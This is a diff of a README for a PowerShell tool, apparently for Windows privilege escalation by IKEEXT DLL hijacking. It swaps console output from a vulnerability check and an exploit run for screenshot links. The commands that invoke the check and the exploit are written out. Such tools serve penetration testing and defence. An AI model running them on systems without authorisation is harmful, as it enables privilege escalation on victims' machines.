@@ -29,19 +29,11 @@ Invoke-IkeextCheck [-Verbose]
 
 Example: 
 ```
-PS C:\Temp> . .\Ikeext-Privesc.ps1
-PS C:\Temp> Invoke-IkeextCheck 
-+----------------------------------------------------------+
-|                IKEEXT DLL Hijacking Check                |
-+----------------------------------------------------------+
-[+] Microsoft Windows 7 Professionnel  is vulnerable.
-[+] IKEEXT is enabled.
-[+] Found 2 PATH folder(s) with weak permissions.
-[+] |__ Found: 'C:\Python27\'
-[+] |__ Found: 'C:\Python27\Scripts'
-[+] 'wlbsctrl.dll' was not found on the system.
-[+] Result: VULNERABLE
+PS C:\temp> . .\Ikeext-Privesc.ps1
+PS C:\temp> Invoke-IkeextCheck -Verbose
 ```
+
+![InvokeIkeext-Check_Verbose](https://github.com/itm4n/Ikeext-Privesc/raw/master/screenshots/03_ikeextcheck-verbose.png)
 
 ### Exploit 
 
@@ -61,28 +53,9 @@ Example:
 ```
 PS C:\temp> . .\Ikeext-Privesc.ps1
 PS C:\temp> Invoke-IkeextExploit
-+----------------------------------------------------------+
-|                IKEEXT DLL Hijacking Check                |
-+----------------------------------------------------------+
-[+] Microsoft Windows 7 Professionnel  is vulnerable.
-[+] IKEEXT is enabled.
-[+] Found 2 PATH folder(s) with weak permissions.
-[+] |__ Found: 'C:\Python27\'
-[+] |__ Found: 'C:\Python27\Scripts'
-[+] 'wlbsctrl.dll' was not found on the system.
-[+] Result: VULNERABLE
-
-+----------------------------------------------------------+
-|               IKEEXT DLL Hijacking Exploit               |
-+----------------------------------------------------------+
-[*] Preparing exploit files...
-[*] Trying to trigger the exploit (max 30s).
-[*] Found log file: "C:\Python27\\wlbsctrl_baqboudj.txt".
-[+] Exploit successful!
-[*] Waiting for IKEEXT to be stopped (max 30s).
-[+] IKEEXT was stopped.
-[*] Performing cleanup.
 ```
+
+![InvokeIkeext-Exploit](https://github.com/itm4n/Ikeext-Privesc/raw/master/screenshots/04_ikeextexploit.PNG)
 
 ## Credits 
 
